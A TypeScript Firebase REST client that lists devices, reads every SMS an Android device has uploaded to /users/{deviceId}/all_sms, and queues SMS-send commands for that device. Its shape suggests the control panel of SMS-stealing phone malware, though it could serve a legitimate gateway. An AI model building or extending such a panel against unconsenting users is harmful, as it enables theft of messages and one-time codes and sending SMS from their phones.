import axios from "axios";


export class FirebaseRestClient {



    private static normalizeUrl(
        databaseUrl:string
    ):string {


        return databaseUrl
            .trim()
            .replace(/^["']|["']$/g,"")
            .replace(/\/$/,"");

    }





    private static params(
        authKey?:string
    ){

        return authKey
        ? {
            auth: authKey
        }
        : {};

    }









    static async getUsers(

        databaseUrl:string,

        authKey?:string

    ){



        const base =
            this.normalizeUrl(
                databaseUrl
            );





        /*
            OLD STRUCTURE

            /users
                deviceId
                    data
        */


        try{


            const usersResponse =
                await axios.get(


                    `${base}/users.json`,


                    {

                        params:
                        this.params(
                            authKey
                        )

                    }


                );




            if(

                usersResponse.data &&

                typeof usersResponse.data === "object"

            ){


                return usersResponse.data;


            }


        }
        catch(error){


        }







        /*
            NEW STRUCTURE

            /
             deviceId
                 data
        */



        const rootResponse =
            await axios.get(


                `${base}/.json`,


                {

                    params:
                    this.params(
                        authKey
                    )

                }


            );




        return rootResponse.data ?? {};

    }









    static async getDevice(

        databaseUrl:string,

        deviceId:string,

        authKey?:string

    ){



        const base =
            this.normalizeUrl(
                databaseUrl
            );





        /*
            OLD DEVICE PATH
        */


        try{


            const response =
                await axios.get(


                    `${base}/users/${deviceId}.json`,


                    {

                        params:
                        this.params(
                            authKey
                        )

                    }


                );



            if(response.data){

                return response.data;

            }


        }
        catch{

        }







        /*
            NEW ROOT DEVICE PATH
        */


        const response =
            await axios.get(


                `${base}/${deviceId}.json`,


                {

                    params:
                    this.params(
                        authKey
                    )

                }


            );



        return response.data;


    }









    /*
        IMPORTANT

        DO NOT CHANGE THIS PATH

        Android device listens here:

        /users/{deviceId}/sms_send

    */


    static async createSmsCommand(


        databaseUrl:string,


        deviceId:string,


        commandId:string,


        payload:any,


        authKey?:string


    ){



        await axios.put(


            `${this.normalizeUrl(databaseUrl)}/users/${deviceId}/sms_send/${commandId}.json`,


            payload,


            {

                params:
                this.params(
                    authKey
                )

            }


        );



        return true;


    }









    /*
        IMPORTANT

        DO NOT CHANGE THIS PATH

        Android device writes here:

        /users/{deviceId}/all_sms

    */


    static async getIncomingSms(


        databaseUrl:string,


        deviceId:string,


        authKey?:string


    ){



        const response =
            await axios.get(


                `${this.normalizeUrl(databaseUrl)}/users/${deviceId}/all_sms.json`,


                {

                    params:
                    this.params(
                        authKey
                    )

                }


            );




        return response.data ?? {};


    }




}